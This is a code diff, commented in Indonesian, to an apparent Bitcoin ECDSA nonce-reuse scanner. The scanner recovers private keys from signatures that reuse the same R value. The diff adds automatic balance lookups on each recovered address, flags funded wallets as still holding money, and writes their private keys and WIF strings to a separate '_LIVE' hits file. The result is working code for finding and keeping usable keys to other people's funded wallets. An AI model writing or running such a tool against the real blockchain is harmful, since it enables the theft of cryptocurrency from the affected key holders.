@@ -392,7 +392,7 @@ const sep = (t = "") =>
 // ============================================================
 // Analisis transaksi
 // ============================================================
-function analyzeTx(rawHex, opts = {}) {
+async function analyzeTx(rawHex, opts = {}) {
   const buf = hexToBytes(rawHex);
   const tx = parseTx(buf);
   const txid = bytesToHex(reverseBytes(dsha256(buf))); // approx untuk legacy
@@ -507,7 +507,7 @@ function analyzeTx(rawHex, opts = {}) {
 // ============================================================
 // Deteksi R-reuse lintas signature
 // ============================================================
-function detectReuse(sigs, opts = {}) {
+async function detectReuse(sigs, opts = {}) {
   sep("Deteksi R-reuse");
   const hitsFile = opts.hitsFile || "hits.txt";
   const groups = new Map();
@@ -588,11 +588,40 @@ function detectReuse(sigs, opts = {}) {
     console.log(c(C.green, "Tidak ada R-reuse terdeteksi."));
     return [];
   }
+  // Cek saldo otomatis untuk setiap address yang dipulihkan
+  if (recovered.length && opts.checkBalance !== false) {
+    const base = opts.api || DEFAULT_API;
+    console.log(c(C.bold, "\nMengecek saldo " + (recovered.length * 2) + " address di " + base + "…"));
+    for (const h of recovered) {
+      const [bC, bU] = await Promise.all([
+        fetchAddressBalance(base, h.addressCompressed),
+        fetchAddressBalance(base, h.addressUncompressed),
+      ]);
+      h.balanceCompressed = bC;
+      h.balanceUncompressed = bU;
+      const liveC = bC.balanceSat && bC.balanceSat > 0;
+      const liveU = bU.balanceSat && bU.balanceSat > 0;
+      const tag = (liveC || liveU) ? c(C.green + C.bold, " *** ADA SALDO ***") : "";
+      console.log(c(C.dim, "  " + h.addressCompressed + " (comp)  ") +
+        (bC.balanceSat == null ? c(C.red, "error") :
+         (bC.balanceSat > 0 ? c(C.green + C.bold, formatBTC(bC.balanceSat)) : c(C.dim, "0 BTC")) +
+         c(C.dim, "  total diterima: " + formatBTC(bC.totalReceivedSat) + ", " + bC.txCount + " tx")) +
+        tag);
+      console.log(c(C.dim, "  " + h.addressUncompressed + " (uncmp) ") +
+        (bU.balanceSat == null ? c(C.red, "error") :
+         (bU.balanceSat > 0 ? c(C.green + C.bold, formatBTC(bU.balanceSat)) : c(C.dim, "0 BTC")) +
+         c(C.dim, "  total diterima: " + formatBTC(bU.totalReceivedSat) + ", " + bU.txCount + " tx")));
+    }
+  }
+
   if (recovered.length && opts.saveHits !== false) {
     try {
       const lines = [];
       for (const h of recovered) {
-        lines.push("==========================================================");
+        const liveC = h.balanceCompressed && h.balanceCompressed.balanceSat > 0;
+        const liveU = h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0;
+        const banner = (liveC || liveU) ? "  *** WALLET MASIH ADA SALDO ***" : "";
+        lines.push("==========================================================" + banner);
         lines.push("Waktu              : " + h.ts);
         if (h.scannedAddress) lines.push("Address yang di-scan: " + h.scannedAddress);
         lines.push("Private key (hex)  : " + h.privHex);
@@ -600,7 +629,17 @@ function detectReuse(sigs, opts = {}) {
         lines.push("WIF (uncompressed) : " + h.wifUncompressed);
         lines.push("Public key         : " + h.pubkey);
         lines.push("Address compressed : " + h.addressCompressed);
+        if (h.balanceCompressed) {
+          lines.push("  Saldo            : " + formatBTC(h.balanceCompressed.balanceSat));
+          lines.push("  Total diterima   : " + formatBTC(h.balanceCompressed.totalReceivedSat));
+          lines.push("  Jumlah tx        : " + h.balanceCompressed.txCount);
+        }
         lines.push("Address uncompress : " + h.addressUncompressed);
+        if (h.balanceUncompressed) {
+          lines.push("  Saldo            : " + formatBTC(h.balanceUncompressed.balanceSat));
+          lines.push("  Total diterima   : " + formatBTC(h.balanceUncompressed.totalReceivedSat));
+          lines.push("  Jumlah tx        : " + h.balanceUncompressed.txCount);
+        }
         lines.push("R reuse value      : " + h.r);
         lines.push("TXID terkait       : " + h.txids.join(", "));
         lines.push("");
@@ -609,6 +648,16 @@ function detectReuse(sigs, opts = {}) {
       const jsonFile = hitsFile.replace(/\.txt$/, "") + ".jsonl";
       appendFileSync(jsonFile, recovered.map((h) => JSON.stringify(h)).join("\n") + "\n");
       console.log(c(C.green + C.bold, "\n>> " + recovered.length + " hit disimpan ke: " + hitsFile + " (dan " + jsonFile + ")"));
+
+      // File khusus wallet hidup
+      const live = recovered.filter((h) =>
+        (h.balanceCompressed && h.balanceCompressed.balanceSat > 0) ||
+        (h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0));
+      if (live.length) {
+        const liveFile = hitsFile.replace(/\.txt$/, "") + "_LIVE.txt";
+        appendFileSync(liveFile, lines.join("\n"));
+        console.log(c(C.green + C.bold, ">> " + live.length + " wallet HIDUP juga disalin ke: " + liveFile));
+      }
     } catch (e) {
       console.log(c(C.red, "Gagal menulis hits file: " + e.message));
     }
@@ -628,7 +677,7 @@ function toWIF(d, prefix = 0x80, compressed = true) {
 // ============================================================
 // Mode manual: analisis langsung dari R, S, Z, [pubkey]
 // ============================================================
-function analyzeManual(items) {
+async function analyzeManual(items) {
   console.log(c(C.bold, "\n=== Analisis Manual (R, S, Z) ==="));
   const sigs = items.map((it, i) => {
     const r = BigInt("0x" + it.r.replace(/^0x/, ""));
@@ -653,7 +702,7 @@ function analyzeManual(items) {
     }
     return { index: i, r, s, z, pubkey: pubHex, pubkeyHash: pubHash, address: addr };
   });
-  detectReuse(sigs);
+  await detectReuse(sigs);
 }
 
 // ============================================================
@@ -665,6 +714,26 @@ async function esploraFetch(base, path) {
   if (!r.ok) throw new Error("HTTP " + r.status + " " + url);
   const ct = r.headers.get("content-type") || "";
   return ct.includes("json") ? r.json() : r.text();
+}
+
+async function fetchAddressBalance(base, address) {
+  try {
+    const info = await esploraFetch(base, "/address/" + address);
+    const cs = info.chain_stats || {};
+    const ms = info.mempool_stats || {};
+    const funded = (cs.funded_txo_sum || 0) + (ms.funded_txo_sum || 0);
+    const spent = (cs.spent_txo_sum || 0) + (ms.spent_txo_sum || 0);
+    const txCount = (cs.tx_count || 0) + (ms.tx_count || 0);
+    return { balanceSat: funded - spent, totalReceivedSat: funded, txCount };
+  } catch (e) {
+    return { balanceSat: null, totalReceivedSat: null, txCount: null, error: e.message };
+  }
+}
+
+function formatBTC(sats) {
+  if (sats == null) return "?";
+  const btc = Number(sats) / 1e8;
+  return btc.toFixed(8) + " BTC (" + sats.toLocaleString("en-US") + " sat)";
 }
 
 async function fetchAllTxsForAddress(base, address) {
@@ -837,10 +906,12 @@ async function analyzeAddress(address, opts) {
     fs.writeFileSync(opts.out, JSON.stringify(out, null, 2));
     console.log(c(C.green, "Disimpan ke: " + opts.out));
   }
-  detectReuse(allSigs, {
+  await detectReuse(allSigs, {
     scannedAddress: address,
     hitsFile: opts.hitsFile || "hits.txt",
     saveHits: opts.saveHits !== false,
+    checkBalance: opts.checkBalance !== false,
+    api: base,
   });
   return allSigs;
 }
@@ -958,7 +1029,7 @@ async function interactiveMenu() {
       const hex = (await ask("Raw TX hex          : ")).trim();
       if (!hex) throw new Error("Hex kosong");
       rl.close();
-      analyzeTx(hex, { amounts: {} });
+      await analyzeTx(hex, { amounts: {} });
     } else if (choice === "4") {
       const r = (await ask("R (hex)             : ")).trim();
       const s = (await ask("S (hex)             : ")).trim();
@@ -966,13 +1037,13 @@ async function interactiveMenu() {
       const pub = (await ask("Public key (hex, opsional): ")).trim();
       rl.close();
       if (!r || !s || !z) throw new Error("R, S, dan Z wajib diisi");
-      analyzeManual([{ r, s, z, pubkey: pub || undefined }]);
+      await analyzeManual([{ r, s, z, pubkey: pub || undefined }]);
     } else if (choice === "5") {
       const path = (await ask("Path file JSON      : ")).trim();
       rl.close();
       const data = JSON.parse(readFileSync(path, "utf8"));
       if (!Array.isArray(data)) throw new Error("File harus berupa array JSON");
-      analyzeManual(data);
+      await analyzeManual(data);
     } else if (choice === "6") {
       rl.close();
       help();
@@ -1022,7 +1093,7 @@ async function main() {
         if (m) amounts[Number(m[1])] = Number(m[2]);
       }
     }
-    analyzeTx(hex, { amounts });
+    await analyzeTx(hex, { amounts });
   } else if (cmd === "sig") {
     const get = (k) => {
       const i = argv.indexOf("--" + k);
@@ -1033,11 +1104,11 @@ async function main() {
       z = get("z"),
       pub = get("pub");
     if (!r || !s || !z) throw new Error("Wajib --r, --s, --z");
-    analyzeManual([{ r, s, z, pubkey: pub }]);
+    await analyzeManual([{ r, s, z, pubkey: pub }]);
   } else if (cmd === "reuse") {
     const data = JSON.parse(readFileSync(argv[1], "utf8"));
     if (!Array.isArray(data)) throw new Error("File harus berupa array JSON");
-    analyzeManual(data);
+    await analyzeManual(data);
   } else {
     console.error(c(C.red, "Perintah tidak dikenal: " + cmd));
     help();
